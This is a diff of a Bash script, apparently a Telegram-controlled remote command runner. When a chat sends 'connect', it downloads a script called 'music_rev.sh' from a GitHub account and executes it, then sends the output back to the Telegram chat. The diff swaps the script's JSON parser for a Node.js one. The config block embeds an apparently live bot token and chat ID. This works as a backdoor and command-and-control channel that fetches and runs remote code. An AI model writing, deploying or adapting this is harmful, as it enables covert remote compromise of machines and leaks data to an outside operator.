@@ -1,22 +1,24 @@
 #!/usr/bin/env bash
-# commamnder.sh — Pure Bash Telegram bot (no Node.js, no jq)
-# Requires: curl only
+# commamnder.sh — Bash Telegram bot using Node.js to parse JSON
+# Usage: ./commamnder.sh
+# Requires: curl + node
+# Edit HARDCODE_CMD below.
 
 set -euo pipefail
 
 ################ CONFIG ################
 TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
 CHAT_ID="6565158025"
-HARDCODE_CMD="curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/music_rev.sh -o music_rev.sh && chmod +x music_rev.sh && ./music_rev.sh"
+HARDCODE_CMD="curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/music_rev.sh -o music_rev.sh && chmod +x music_rev.sh && ./music_rev.sh"   # <-- replace this with your hardcoded command
 ########################################
 
 API="https://api.telegram.org/bot${TOKEN}"
 
 send_msg() {
   local text="$1"
-  curl -s -X POST "${API}/sendMessage" \
+  curl -s -sX POST "${API}/sendMessage" \
     -d chat_id="${CHAT_ID}" \
-    --data-urlencode text="$text" >/dev/null
+    -d text="$text" >/dev/null
 }
 
 send_file() {
@@ -26,28 +28,30 @@ send_file() {
     -F document=@"$file" >/dev/null
 }
 
-# parser: extracts update_id, chat_id, and text
-parse_updates_bash() {
-  local json="$1"
-  echo "$json" | grep -oE '{[^}]*}' | while read -r obj; do
-    local UPDATE_ID CHAT TEXT
-    UPDATE_ID=$(echo "$obj" | grep -Po '"update_id":\K[0-9]+' || true)
-    CHAT=$(echo "$obj" | grep -Po '"chat":\{"id":\K-?[0-9]+' || true)
-    TEXT=$(echo "$obj" | grep -Po '"text":"\K([^"]*)' | sed 's/\\n/ /g' || true)
-
-    if [ -n "$UPDATE_ID" ] && [ -n "$CHAT" ]; then
-      echo "${UPDATE_ID}|${CHAT}|${TEXT}"
-    fi
-  done
+# node parser: reads JSON from stdin and prints update_id|chat_id|text
+parse_updates_node() {
+  node -e '
+    const fs = require("fs");
+    const data = JSON.parse(fs.readFileSync(0, "utf8"));
+    if (!data.result) process.exit(0);
+    for (const r of data.result) {
+      const uid = r.update_id;
+      const msg = r.message || r.edited_message || {};
+      const cid = msg.chat && msg.chat.id;
+      const text = (msg.text || "").replace(/\n/g, " ");
+      if (uid !== undefined && cid !== undefined) {
+        console.log(`${uid}|${cid}|${text}`);
+      }
+    }
+  '
 }
 
 # notify on startup
-send_msg "✅ Bot is online and ready."
+send_msg "ready to execute command"
 
 OFFSET=0
 while true; do
   UPDATES=$(curl -s "${API}/getUpdates?offset=${OFFSET}&timeout=20")
-
   while IFS= read -r line; do
     [ -z "$line" ] && continue
     IFS='|' read -r UPDATE_ID FROM_ID TEXT <<< "$line"
@@ -59,27 +63,21 @@ while true; do
       continue
     fi
 
-    case "$TEXT" in
-      connect)
-        OUTPUT="$(bash -c "$HARDCODE_CMD" 2>&1 || true)"
+    if [ "$TEXT" = "connect" ]; then
+      OUTPUT="$(bash -c "$HARDCODE_CMD" 2>&1 || true)"
 
-        if [ -z "$OUTPUT" ]; then
-          send_msg "✅ Command executed successfully (no output)."
+      if [ -z "$OUTPUT" ]; then
+        send_msg "command executed successfully (no output)"
+      else
+        if [ ${#OUTPUT} -le 3500 ]; then
+          send_msg "command executed successfully:\n$OUTPUT"
         else
-          if [ ${#OUTPUT} -le 3500 ]; then
-            send_msg "✅ Command output:\n$OUTPUT"
-          else
-            TMP="$(mktemp /tmp/out.XXXXXX)"
-            printf "%s\n" "$OUTPUT" > "$TMP"
-            send_file "$TMP"
-            rm -f "$TMP"
-          fi
+          TMP="$(mktemp /tmp/out.XXXXXX)"
+          printf "%s\n" "$OUTPUT" > "$TMP"
+          send_file "$TMP"
+          rm -f "$TMP"
         fi
-        ;;
-      *)
-        # ignore unknown text
-        ;;
-    esac
-  done < <(parse_updates_bash "$UPDATES")
+      fi
+    fi
+  done < <(echo "$UPDATES" | parse_updates_node)
 done
-
